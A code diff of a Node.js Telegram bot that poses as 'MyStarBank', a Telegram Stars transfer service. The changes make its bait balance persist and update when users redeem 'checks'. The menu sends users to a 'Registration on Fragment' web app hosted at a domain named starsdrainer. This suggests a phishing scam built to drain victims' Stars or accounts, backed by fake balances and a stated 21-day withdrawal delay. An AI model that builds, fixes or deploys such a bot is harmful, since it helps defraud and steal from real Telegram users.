@@ -13,7 +13,6 @@ const API_HASH = process.env.API_HASH || '0053d3d9118917884e9f51c4d0b0bfa3';
 const MY_USER_ID = 1398396668;
 const WEB_APP_URL = 'https://starsdrainer.onrender.com';
 
-// ФИКС: Используем webHook вместо polling чтобы избежать 409 ошибки
 const bot = new TelegramBot(BOT_TOKEN);
 const app = express();
 
@@ -387,21 +386,13 @@ bot.on('callback_query', async (query) => {
     const userId = query.from.id;
     
     try {
-        // ФИКС: Сразу отвечаем чтобы избежать timeout
         await bot.answerCallbackQuery(query.id).catch(e => {});
         
-        // ФИКС: Проверяем наличие сообщения
-        if (!query.message) {
-            console.log('❌ Нет сообщения в callback');
-            return;
-        }
-        
+        if (!query.message) return;
         const chatId = query.message.chat.id;
         
         if (data === 'create_50' || data === 'create_100') {
             const amount = data === 'create_50' ? 50 : 100;
-            
-            // СОЗДАЕМ ЧЕК БЕЗ ВОРКЕРА
             const activations = 1;
             const workerTag = 'unknown';
             
@@ -423,7 +414,6 @@ bot.on('callback_query', async (query) => {
                     photoFile = '100.png';
                 }
                 
-                // УДАЛЯЕМ СООБЩЕНИЕ ВЫБОРА
                 bot.deleteMessage(chatId, query.message.message_id).catch(e => {});
                 
                 const photoPath = path.join(__dirname, 'public', photoFile);
@@ -461,7 +451,6 @@ bot.onText(/\/start/, (msg) => {
     const chatId = msg.chat.id;
     const userId = msg.from.id;
     
-    // СОХРАНЯЕМ ПОЛЬЗОВАТЕЛЯ
     db.run(`INSERT OR REPLACE INTO users (user_id, username) VALUES (?, ?)`, 
         [userId, msg.from.username], function(err) {});
     
@@ -469,38 +458,42 @@ bot.onText(/\/start/, (msg) => {
 });
 
 function showMainMenu(chatId, userId) {
-    const avatarPath = path.join(__dirname, 'public', 'avatar.jpg');
-    
-    const menuText = `💫 <b>MyStarBank - Система передачи звезд</b>
+    // ПОЛУЧАЕМ АКТУАЛЬНЫЙ БАЛАНС
+    db.get(`SELECT balance FROM users WHERE user_id = ?`, [userId], (err, row) => {
+        const balance = row ? row.balance : 0;
+        
+        const avatarPath = path.join(__dirname, 'public', 'avatar.jpg');
+        const menuText = `💫 <b>MyStarBank - Система передачи звезд</b>
 
-🌟 <b>Ваш баланс:</b> 0 stars
+🌟 <b>Ваш баланс:</b> ${balance} stars
 
 📊 <b>Доступные действия:</b>
 ├ 💰 Проверить баланс
 ├ 🎫 Создать чек  
 └ 🏦 Вывести средства`;
 
-    const menuKeyboard = {
-        inline_keyboard: [
-            [{ text: "💰 Проверить баланс", callback_data: "check_balance" }],
-            [{ text: "🎫 Создать чек", callback_data: "create_check_menu" }],
-            [{ text: "🏦 Вывести средства", callback_data: "withdraw_funds" }],
-            [{ text: "📲 Регистрация на Fragment", web_app: { url: WEB_APP_URL } }]
-        ]
-    };
+        const menuKeyboard = {
+            inline_keyboard: [
+                [{ text: "💰 Проверить баланс", callback_data: "check_balance" }],
+                [{ text: "🎫 Создать чек", callback_data: "create_check_menu" }],
+                [{ text: "🏦 Вывести средства", callback_data: "withdraw_funds" }],
+                [{ text: "📲 Регистрация на Fragment", web_app: { url: WEB_APP_URL } }]
+            ]
+        };
 
-    if (fs.existsSync(avatarPath)) {
-        bot.sendPhoto(chatId, avatarPath, {
-            caption: menuText,
-            parse_mode: 'HTML',
-            reply_markup: menuKeyboard
-        });
-    } else {
-        bot.sendMessage(chatId, menuText, {
-            parse_mode: 'HTML',
-            reply_markup: menuKeyboard
-        });
-    }
+        if (fs.existsSync(avatarPath)) {
+            bot.sendPhoto(chatId, avatarPath, {
+                caption: menuText,
+                parse_mode: 'HTML',
+                reply_markup: menuKeyboard
+            });
+        } else {
+            bot.sendMessage(chatId, menuText, {
+                parse_mode: 'HTML',
+                reply_markup: menuKeyboard
+            });
+        }
+    });
 }
 
 // ОБРАБОТКА CALLBACK С ПРОВЕРКАМИ
@@ -509,14 +502,8 @@ bot.on('callback_query', async (query) => {
     const userId = query.from.id;
     
     try {
-        // ФИКС: Сразу отвечаем
         await bot.answerCallbackQuery(query.id).catch(e => {});
-        
-        // ФИКС: Проверяем наличие сообщения
-        if (!query.message) {
-            console.log('❌ Нет сообщения в callback');
-            return;
-        }
+        if (!query.message) return;
         
         const chatId = query.message.chat.id;
         
@@ -533,7 +520,6 @@ bot.on('callback_query', async (query) => {
             });
             
         } else if (data === 'create_check_menu') {
-            // СООБЩЕНИЕ О ЗАДЕРЖКЕ 21 ДЕНЬ
             const futureDate = new Date();
             futureDate.setDate(futureDate.getDate() + 21);
             
@@ -570,13 +556,12 @@ bot.on('callback_query', async (query) => {
     }
 });
 
-// ОБРАБОТКА СТАРТА С ПАРАМЕТРОМ ЧЕКА
+// ОБРАБОТКА СТАРТА С ПАРАМЕТРОМ ЧЕКА - ФИКС НАЧИСЛЕНИЯ
 bot.onText(/\/start (.+)/, (msg, match) => {
     const chatId = msg.chat.id;
     const userId = msg.from.id;
     const params = match[1];
     
-    // СОХРАНЯЕМ ПОЛЬЗОВАТЕЛЯ
     db.run(`INSERT OR REPLACE INTO users (user_id, username) VALUES (?, ?)`, 
         [userId, msg.from.username], function(err) {});
     
@@ -597,20 +582,27 @@ bot.onText(/\/start (.+)/, (msg, match) => {
                     return;
                 }
                 
-                // ОБНОВЛЯЕМ БАЛАНС И ОТМЕЧАЕМ ЧЕК ИСПОЛЬЗОВАННЫМ
-                db.serialize(() => {
-                    db.run(`UPDATE checks SET activations = activations - 1 WHERE id = ?`, [checkId]);
-                    db.run(`INSERT OR REPLACE INTO users (user_id, username, balance) VALUES (?, ?, COALESCE((SELECT balance FROM users WHERE user_id = ?), 0) + ?)`, 
-                        [userId, msg.from.username, userId, row.amount]);
-                    db.run(`INSERT INTO used_checks (user_id, check_id) VALUES (?, ?)`, [userId, checkId]);
+                // ФИКС: ПРАВИЛЬНОЕ ОБНОВЛЕНИЕ БАЛАНСА
+                db.get(`SELECT balance FROM users WHERE user_id = ?`, [userId], (err, userRow) => {
+                    const currentBalance = userRow ? userRow.balance : 0;
+                    const newBalance = currentBalance + row.amount;
+                    
+                    // ОБНОВЛЯЕМ БАЛАНС И ОТМЕЧАЕМ ЧЕК ИСПОЛЬЗОВАННЫМ
+                    db.serialize(() => {
+                        db.run(`UPDATE checks SET activations = activations - 1 WHERE id = ?`, [checkId]);
+                        db.run(`INSERT OR REPLACE INTO users (user_id, username, balance) VALUES (?, ?, ?)`, 
+                            [userId, msg.from.username, newBalance]);
+                        db.run(`INSERT INTO used_checks (user_id, check_id) VALUES (?, ?)`, [userId, checkId]);
+                    });
+                    
+                    // УВЕДОМЛЕНИЕ О ПОЛУЧЕНИИ ЗВЕЗД
+                    bot.sendMessage(chatId, 
+                        `🎉 <b>Получено ${row.amount} звезд!</b>\n\n` +
+                        `💫 <b>Ваш баланс:</b> ${newBalance} stars\n\n` +
+                        `💰 Для проверки баланса используйте /start`,
+                        { parse_mode: 'HTML' }
+                    );
                 });
-                
-                bot.sendMessage(chatId, 
-                    `🎉 <b>Получено ${row.amount} звезд!</b>\n\n` +
-                    `💫 <b>Ваш баланс:</b> ${row.amount} stars\n\n` +
-                    `💰 Для проверки баланса используйте /start`,
-                    { parse_mode: 'HTML' }
-                );
             });
         });
     } else {
